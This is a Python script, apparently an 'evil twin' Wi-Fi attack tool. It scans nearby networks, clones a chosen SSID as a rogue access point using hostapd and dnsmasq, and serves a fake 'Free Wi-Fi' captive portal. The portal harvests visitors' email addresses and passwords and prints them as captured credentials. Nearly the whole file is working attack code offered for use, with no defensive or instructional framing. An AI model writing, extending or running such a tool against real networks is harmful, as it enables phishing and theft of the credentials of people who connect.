import os
import subprocess
import time
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Function to list available Wi-Fi adapters
def list_wifi_adapters():
    try:
        print("[*] Listing available Wi-Fi adapters...")
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        adapters = []
        for line in result.stdout.splitlines():
            if "IEEE 802.11" in line:
                adapter = line.split()[0]
                adapters.append(adapter)

        if not adapters:
            raise Exception("No Wi-Fi adapters found. Ensure your Wi-Fi adapter is connected and recognized.")

        return adapters
    except Exception as e:
        print(f"[!] Error listing Wi-Fi adapters: {e}")
        return []

# Function to scan for available Wi-Fi networks
def scan_wifi(adapter):
    try:
        print(f"[*] Scanning for available Wi-Fi networks using {adapter}...")
        result = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception("Failed to scan Wi-Fi networks. Ensure 'nmcli' is installed and your Wi-Fi adapter is functioning.")

        networks = result.stdout.splitlines()[1:]  # Skip the header line
        networks = [net.strip() for net in networks if net.strip()]  # Remove empty lines

        if not networks:
            raise Exception("No Wi-Fi networks found. Ensure your Wi-Fi adapter is functioning properly.")

        return networks
    except Exception as e:
        print(f"[!] Error during Wi-Fi scan: {e}")
        return []

# Function to reset the adapter and stop interfering processes
def reset_adapter(adapter):
    try:
        print(f"[*] Resetting the adapter: {adapter}")

        # Stop NetworkManager to prevent interference
        print("[*] Stopping NetworkManager...")
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)

        # Kill wpa_supplicant processes related to the adapter
        print("[*] Checking for wpa_supplicant processes...")
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        lines = [line for line in result.stdout.splitlines() if "wpa_supplicant" in line and adapter in line]

        if lines:
            for line in lines:
                pid = line.split()[1]  # Extract the PID (second column)
                print(f"[!] Killing wpa_supplicant process with PID: {pid}")
                subprocess.run(["kill", "-9", pid], check=True)
            time.sleep(1)  # Allow time for the process to terminate
        else:
            print("[*] No wpa_supplicant processes found for this adapter.")

        # Bring the adapter down
        print(f"[*] Bringing down the adapter: {adapter}")
        subprocess.run(["ip", "link", "set", adapter, "down"], check=True)

        # Bring the adapter back up
        print(f"[*] Bringing up the adapter: {adapter}")
        subprocess.run(["ip", "link", "set", adapter, "up"], check=True)

    except subprocess.CalledProcessError as e:
        print(f"[!] Error resetting adapter: {e}")
        exit(1)
    except Exception as e:
        print(f"[!] Unexpected error during adapter reset: {e}")
        exit(1)

# Function to set up a rogue access point
def setup_rogue_ap(adapter, ssid):
    try:
        print(f"[*] Setting up rogue access point for SSID: {ssid} on {adapter}...")
        with open("/etc/hostapd/hostapd.conf", "w") as f:
            f.write(f"interface={adapter}\n")
            f.write(f"driver=nl80211\n")
            f.write(f"ssid={ssid}\n")
            f.write(f"hw_mode=g\n")
            f.write(f"channel=6\n")
            f.write(f"auth_algs=1\n")
            f.write(f"wpa=2\n")
            f.write(f"wpa_passphrase=password123\n")
            f.write(f"wpa_key_mgmt=WPA-PSK\n")
            f.write(f"rsn_pairwise=CCMP\n")

        # Stop NetworkManager to avoid conflicts
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        subprocess.run(["hostapd", "/etc/hostapd/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error setting up rogue access point: {e}")
        exit(1)
    except Exception as e:
        print(f"[!] Unexpected error during rogue AP setup: {e}")
        exit(1)

# Function to set up DNS and DHCP
def setup_dns_dhcp(adapter):
    try:
        print("[*] Setting up DNS and DHCP...")
        with open("/etc/dnsmasq.conf", "w") as f:
            f.write(f"interface={adapter}\n")
            f.write("dhcp-range=192.168.1.10,192.168.1.100,12h\n")
            f.write("dhcp-option=3,192.168.1.1\n")
            f.write("dhcp-option=6,192.168.1.1\n")
            f.write("server=8.8.8.8\n")

        subprocess.run(["dnsmasq", "--conf-file=/etc/dnsmasq.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error setting up DNS and DHCP: {e}")
        exit(1)
    except Exception as e:
        print(f"[!] Unexpected error during DNS/DHCP setup: {e}")
        exit(1)

# Captive Portal Flask App
@app.route("/", methods=["GET", "POST"])
def captive_portal():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        print(f"[*] Captured credentials - Email: {email}, Password: {password}")
        return "Thank you for connecting!"
    return render_template_string('''
        <h1>Welcome to Free Wi-Fi</h1>
        <form method="POST">
            Email: <input type="text" name="email"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Connect">
        </form>
    ''')

def main():
    try:
        # Step 1: List available Wi-Fi adapters
        adapters = list_wifi_adapters()
        if not adapters:
            print("[!] No Wi-Fi adapters found. Exiting.")
            exit(1)

        print("[*] Available Wi-Fi adapters:")
        for i, adapter in enumerate(adapters):
            print(f"{i + 1}. {adapter}")

        # Step 2: Select a Wi-Fi adapter
        selected_adapter = input("[*] Enter the number of the Wi-Fi adapter to use: ")
        try:
            selected_adapter = adapters[int(selected_adapter) - 1]
        except (IndexError, ValueError):
            print("[!] Invalid selection. Exiting.")
            exit(1)

        # Step 3: Scan for available Wi-Fi networks
        networks = scan_wifi(selected_adapter)
        if not networks:
            print("[!] No networks found. Exiting.")
            exit(1)

        print("[*] Available Wi-Fi networks:")
        for i, ssid in enumerate(networks):
            print(f"{i + 1}. {ssid}")

        # Step 4: Select a network to mimic
        selected = input("[*] Enter the number of the network you want to mimic: ")
        try:
            selected_ssid = networks[int(selected) - 1]
        except (IndexError, ValueError):
            print("[!] Invalid selection. Exiting.")
            exit(1)

        # Step 5: Reset the adapter and set up the rogue access point
        reset_adapter(selected_adapter)
        setup_rogue_ap(selected_adapter, selected_ssid)

        # Step 6: Set up DNS and DHCP
        setup_dns_dhcp(selected_adapter)

        # Step 7: Start the captive portal
        print("[*] Starting captive portal...")
        app.run(host="192.168.1.1", port=80)

    except KeyboardInterrupt:
        print("\n[*] Script interrupted by user. Exiting.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    finally:
        # Cleanup: Restart NetworkManager
        print("[*] Cleaning up...")
        subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if __name__ == "__main__":
    main()
